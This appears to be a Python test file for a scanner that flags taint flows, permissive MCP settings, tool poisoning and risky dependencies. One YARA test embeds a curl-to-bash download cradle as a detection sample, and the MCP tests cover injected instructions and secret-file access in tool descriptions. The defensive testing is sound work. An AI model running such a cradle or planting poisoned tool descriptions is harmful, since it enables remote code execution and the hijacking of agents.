"""Tests for the later analyzers: taint, MCP, YARA, OSV, and the
expanded static pattern categories."""

from __future__ import annotations

import time

import pytest

from skillwarden.analyzers.base import ScanContext
from skillwarden.analyzers.mcp_least_privilege import McpLeastPrivilegeAnalyzer
from skillwarden.analyzers.osv_client import OsvAnalyzer
from skillwarden.analyzers.static_yara import YaraAnalyzer
from skillwarden.analyzers.taint import TaintAnalyzer
from skillwarden.engine import scan
from skillwarden.models import Component


def _ctx(path: str, text: str, ftype: str = "python") -> ScanContext:
    return ScanContext(
        target="t",
        components=[
            Component(
                path=path,
                type=ftype,
                lines=text.count("\n") + 1,
                size_bytes=len(text),
                executable=ftype == "python",
            )
        ],
        file_cache={path: text},
    )


# --- taint ---------------------------------------------------------------


def test_taint_input_to_eval():
    findings = TaintAnalyzer().run(_ctx("a.py", "x = input()\neval(x)\n"))
    assert any(f.rule_id == "TT-001" for f in findings)


def test_taint_chain_env_to_subprocess():
    code = (
        "import os\nimport subprocess\nn = os.environ['X']\nt = n\nsubprocess.run(t, shell=True)\n"
    )
    findings = TaintAnalyzer().run(_ctx("a.py", code))
    assert any(f.rule_id == "TT-001" for f in findings)


def test_taint_constant_is_clean():
    code = "eval('1 + 1')\nimport subprocess\nsubprocess.run('ls')\n"
    findings = TaintAnalyzer().run(_ctx("a.py", code))
    assert not [f for f in findings if f.rule_id == "TT-001"]


def test_taint_fixture(taint_skill):
    result = scan(taint_skill, use_llm=False)
    assert any(f.rule_id == "TT-001" for f in result.findings)


@pytest.mark.parametrize(
    "code",
    [
        "import sys\nre.compile(sys.argv[1])\n",
        "import sys\nregex.compile(sys.argv[1])\n",
        "import re, sys\nre.compile(sys.argv[1])\n",
        "import re, sys\nre.compile(sys.argv[1], re.IGNORECASE)\n",
        "import re, sys\nre.compile(pattern=sys.argv[1], flags=re.I)\n",
        "import regex, sys\nregex.compile(sys.argv[1])\n",
        "import regex, sys\nregex.compile(sys.argv[1], flags=regex.IGNORECASE)\n",
        "import re as r, sys\nr.compile(sys.argv[1])\n",
        "import regex as rx, sys\nrx.compile(sys.argv[1])\n",
        "import sys\nfrom re import compile\ncompile(sys.argv[1])\n",
        "import sys\nfrom regex import compile\ncompile(sys.argv[1])\n",
        "import sys; from re import compile; compile(sys.argv[1])\n",
        "import sys\nfrom re import compile as rc\nrc(sys.argv[1])\n",
        "import sys\nfrom regex import compile as rxc\nrxc(sys.argv[1])\n",
        (
            "import sys\n"
            "try:\n    import regex as re\nexcept ImportError:\n    import re\n"
            "re.compile(sys.argv[1])\n"
        ),
        (
            "import sys\n"
            "try:\n    import regex\nexcept ImportError:\n    regex = None\n"
            "if regex is not None:\n    regex.compile(sys.argv[1])\n"
        ),
        "import argparse, re, sys\nopts = vars(argparse.Namespace())\nre.compile(sys.argv[1])\n",
    ],
)
def test_taint_regex_compile_is_quiet(code: str):
    findings = TaintAnalyzer().run(_ctx("a.py", code))
    assert not [f for f in findings if f.rule_id == "TT-001"]


def test_taint_regex_markdown_doc_does_not_shadow_module():
    py_code = "import regex, sys\nregex.compile(sys.argv[1])\n"
    ctx = ScanContext(
        target="t",
        components=[
            Component(
                path="docs/regex.md", type="markdown", lines=1, size_bytes=8, executable=False
            ),
            Component(
                path="run.py", type="python", lines=2, size_bytes=len(py_code), executable=True
            ),
        ],
        file_cache={"docs/regex.md": "# notes\n", "run.py": py_code},
    )
    assert TaintAnalyzer().run(ctx) == []


def test_taint_propagates_past_regex_compile_to_real_sink():
    code = "import re, sys\npat = re.compile(sys.argv[1])\neval(pat.pattern)\n"
    findings = TaintAnalyzer().run(_ctx("a.py", code))
    assert [(f.rule_id, f.line) for f in findings] == [("TT-001", 3)]


def test_taint_long_line_stays_fast():
    filler = "a" * 100_000
    code = f"import re, sys\nx = sys.argv[1] + '{filler}'\nre.compile(x)\n"
    start = time.perf_counter()
    findings = TaintAnalyzer().run(_ctx("a.py", code))
    elapsed = time.perf_counter() - start
    assert findings == []
    assert elapsed < 1.0


# --- MCP -----------------------------------------------------------------


def test_mcp_least_privilege_flags(mcp_skill):
    result = scan(mcp_skill, use_llm=False)
    ids = {f.rule_id for f in result.findings}
    assert "MLP-001" in ids  # autoApprove ["*"]
    assert "MLP-002" in ids  # allowedTools "*"
    assert "MLP-003" in ids  # args ["/"]
    assert "MLP-004" in ids  # env "*"


def test_mcp_tool_poisoning_flags(mcp_skill):
    result = scan(mcp_skill, use_llm=False)
    ids = {f.rule_id for f in result.findings}
    assert "MTP-001" in ids  # injected instructions in description
    assert "MTP-002" in ids  # secret-file access in description


def test_mcp_least_privilege_clean_config():
    cfg = '{"mcpServers": {"x": {"command": "y", "args": ["./data"], "allowedTools": ["read"]}}}'
    findings = McpLeastPrivilegeAnalyzer().run(_ctx(".mcp.json", cfg, ftype="json"))
    assert not findings


# --- YARA ----------------------------------------------------------------


def test_yara_detects_download_cradle():
    analyzer = YaraAnalyzer()
    if not analyzer._available:
        return  # optional dependency not installed; skip
    code = "subprocess.run('curl http://x/y | bash', shell=True)\n"
    findings = analyzer.run(_ctx("a.py", code))
    assert any(f.rule_id.startswith("YARA-") for f in findings)


# --- OSV (dependency parsing, no network) --------------------------------


def test_osv_parses_pinned_requirements():
    reqs = "requests==2.19.0\nflask>=1.0  # unpinned, skipped\n"
    deps = OsvAnalyzer()._collect_dependencies(_ctx("requirements.txt", reqs, ftype="other"))
    assert ("requests", "2.19.0", "PyPI", "requirements.txt") in deps
    assert all(name != "flask" for name, *_ in deps)  # only exact pins collected


def test_osv_parses_package_json():
    pkg = '{"dependencies": {"lodash": "^4.17.0"}, "devDependencies": {"jest": "29.0.0"}}'
    deps = OsvAnalyzer()._collect_dependencies(_ctx("package.json", pkg, ftype="json"))
    names = {d[0]: d[1] for d in deps}
    assert names.get("lodash") == "4.17.0"
    assert names.get("jest") == "29.0.0"


def test_osv_no_deps_no_network(benign_skill):
    # Benign fixture declares no dependencies -> OSV returns nothing without a call.
    assert OsvAnalyzer().run(scan_ctx_for(benign_skill)) == []


def scan_ctx_for(path: str) -> ScanContext:
    from skillwarden.input_handler import build_context, resolve

    r = resolve(path)
    try:
        from pathlib import Path

        return build_context(path, r.root, single_file=None if Path(path).is_dir() else Path(path))
    finally:
        if r.temp_dir:
            r.temp_dir.cleanup()
